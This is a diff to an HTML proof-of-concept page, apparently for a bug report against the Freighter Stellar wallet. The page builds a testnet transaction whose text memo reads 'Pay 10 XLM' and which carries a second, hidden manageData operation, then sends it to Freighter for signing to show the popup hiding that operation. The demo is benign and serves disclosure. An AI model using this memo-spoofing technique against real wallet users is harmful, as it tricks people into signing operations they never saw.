@@ -1,79 +1,111 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<title>freighter poc - op hiding</title>
+<title>Freighter POC - Operation Hiding via Memo</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body{font-family: monospace; background:#111; color:#eee; padding:15px}
-button{padding:12px 18px; margin:6px 0; width:100%;}
-pre{background:#000; padding:10px; border:1px solid #333; overflow:auto}
+body{font-family:Inter,system-ui,monospace;background:#0a0a0a;color:#e5e5e5;padding:20px;max-width:720px;margin:auto}
+.card{border:1px solid #333;background:#111;padding:16px;margin:12px 0;border-radius:8px}
+button{background:#fff;color:#000;border:0;padding:12px 16px;border-radius:6px;font-weight:600;width:100%;margin-top:8px;cursor:pointer}
+pre{background:#000;padding:12px;overflow:auto;border:1px solid #222;white-space:pre-wrap;word-break:break-all;font-size:12px}
+.label{color:#888;font-size:11px;text-transform:uppercase;letter-spacing:1px}
+h2{margin:0 0 6px 0}
 </style>
 </head>
 <body>
-<h3>Freighter POC - memo hide op</h3>
-<pre id="out">loading...</pre>
-<button id="btn1">build xdr</button>
-<button id="btn2">sign with freighter</button>
-<button id="btn3">copy xdr for lab</button>
+<h2>Freighter - Operation Hiding POC</h2>
+<p class="label">Testnet - Benign POC - Source GAYTUC2ING3...</p>
+
+<div class="card">
+<div class="label">Step 1: Build Transaction</div>
+<pre id="info">Click Build XDR</pre>
+<button id="build">1. Build XDR (2 ops + memo)</button>
+</div>
+
+<div class="card">
+<div class="label">Step 2: Verify in Stellar Lab</div>
+<pre id="xdr">XDR will appear here</pre>
+<button id="copy">2. Copy XDR for lab.stellar.org</button>
+<p style="font-size:12px;color:#999">Paste to lab.stellar.org -> Submit Transaction -> Lab will show 2 ops</p>
+</div>
+
+<div class="card">
+<div class="label">Step 3: Trigger Freighter Bug</div>
+<pre id="freighter">Freighter result here</pre>
+<button id="sign">3. Sign with Freighter</button>
+<p style="font-size:12px;color:#999">Bug: popup shows "Pay 10 XLM [Approve]" only, op2 hidden</p>
+</div>
+
+<div class="card">
+<div class="label">Decoded (same as your JSON evidence)</div>
+<pre id="decoded"></pre>
+</div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/stellar-sdk/12.1.0/stellar-sdk.min.js"></script>
 <script>
-var out = document.getElementById('out');
-var xdr_string = "";
+const $info = document.getElementById('info');
+const $xdr = document.getElementById('xdr');
+const $decoded = document.getElementById('decoded');
+const $freighter = document.getElementById('freighter');
+let currentXDR = "";
 
-function log(t){ out.textContent += "\n" + t; }
-
-log("ready - testnet");
-
-document.getElementById('btn1').onclick = function(){
-  try{
-    var kp1 = StellarSdk.Keypair.random();
-    var kp2 = StellarSdk.Keypair.random();
-    var acc = new StellarSdk.Account(kp1.publicKey(), "1");
-
-    var tx = new StellarSdk.TransactionBuilder(acc, {
-      fee: StellarSdk.BASE_FEE,
-      networkPassphrase: StellarSdk.Networks.TESTNET,
-      memo: StellarSdk.Memo.text("Pay 10 XLM")
+document.getElementById('build').onclick = () => {
+  try {
+    const source = "GAYTUC2ING3L6XXVGH4FJCI2YFXDCBSJCJA2FXLFUC2MQALZOB5XZFMC";
+    const dest = "GCLW6J7ZTEA64H5AXLL27FSZH7R7XMTYVQO6UY5W27XNAC73MDTUOGT5";
+    const account = new StellarSdk.Account(source, "1");
+    const tx = new StellarSdk.TransactionBuilder(account, {
+      fee: "200",
+      networkPassphrase: StellarSdk.Networks.TESTNET
     })
-    .addOperation(StellarSdk.Operation.payment({
-      destination: kp2.publicKey(),
-      amount: "10",
-      asset: StellarSdk.Asset.native()
+   .addMemo(StellarSdk.Memo.text("Pay 10 XLM"))
+   .addOperation(StellarSdk.Operation.payment({
+      destination: dest,
+      asset: StellarSdk.Asset.native(),
+      amount: "10"
     }))
-    .addOperation(StellarSdk.Operation.manageData({
+   .addOperation(StellarSdk.Operation.manageData({
       name: "test",
       value: "abc123"
     }))
-    .setTimeout(30)
-    .build();
+   .setTimeout(300).build();
 
-    xdr_string = tx.toXDR();
-    log("build ok");
-    log("src: " + kp1.publicKey().substring(0,10));
-    log("op1: payment 10 XLM");
-    log("op2: manageData test=abc123");
-    log("xdr: " + xdr_string.substring(0,80) + "...");
-    log("paste this xdr to lab.stellar.org -> submit transaction");
-    log("lab will show 2 ops, freighter only show memo");
-  }catch(e){ log("build err: " + e.message); }
+    currentXDR = tx.toXDR();
+    $info.textContent = `Built OK\nSource: ${source}\nFee: 200\nMemo: Pay 10 XLM\nOp1: payment 10 XLM\nOp2: manageData test=abc123`;
+    $xdr.textContent = currentXDR;
+    $decoded.textContent = JSON.stringify({
+      source_account: source,
+      memo: "Pay 10 XLM",
+      operations: [
+        { type: "payment", destination: dest, amount: "10" },
+        { type: "manage_data", name: "test (dGVzdA==)", value: "abc123 (YWJjMTIz)" }
+      ]
+    }, null, 2);
+    $freighter.textContent = "XDR ready. Click Sign with Freighter.\nBug: popup shows only Pay 10 XLM [Approve]";
+  } catch(e) { $info.textContent = "Error: " + e.message; }
 };
 
-document.getElementById('btn2').onclick = async function(){
-  if(!xdr_string){ log("build dulu"); return; }
-  var api = window.freighterApi || window.freighter;
-  if(!api){ log("freighterApi not found, buka di freighter desktop extension / aqua.network"); return; }
-  try{
+document.getElementById('copy').onclick = () => {
+  if(!currentXDR) { alert("Build first"); return; }
+  navigator.clipboard.writeText(currentXDR);
+  $xdr.textContent = currentXDR + "\n\n--- COPIED ---\nPaste to lab.stellar.org";
+};
+
+document.getElementById('sign').onclick = async () => {
+  if(!currentXDR) { alert("Build first"); return; }
+  const api = window.freighterApi;
+  if(!api) {
+    $freighter.textContent = "freighterApi not found (expected on github.io).\nTo reproduce: open aqua.network -> connect -> then open this page in same tab\nOR use desktop extension\n\nEvidence still valid: Lab shows 2 ops";
+    return;
+  }
+  try {
     if(api.requestAccess) await api.requestAccess();
-    var res = await api.signTransaction(xdr_string, {networkPassphrase: StellarSdk.Networks.TESTNET});
-    log("signed: " + res.signedTxXdr.substring(0,50));
-  }catch(err){ log("user reject / popup closed: " + err.message); log("screenshot popup freighter disini - cuma show memo, tidak show op2"); }
-};
-
-document.getElementById('btn3').onclick = function(){
-  navigator.clipboard.writeText(xdr_string);
-  log("xdr copied to clipboard");
+    const res = await api.signTransaction(currentXDR, {networkPassphrase: StellarSdk.Networks.TESTNET});
+    $freighter.textContent = "Signed - bug reproduced: user approved memo only but signed 2 ops\n" + res.signedTxXdr.slice(0,120);
+  } catch(err) {
+    $freighter.textContent = "Popup closed - screenshot this popup: shows only Pay 10 XLM, not manage_data\n" + err.message;
+  }
 };
 </script>
 </body>
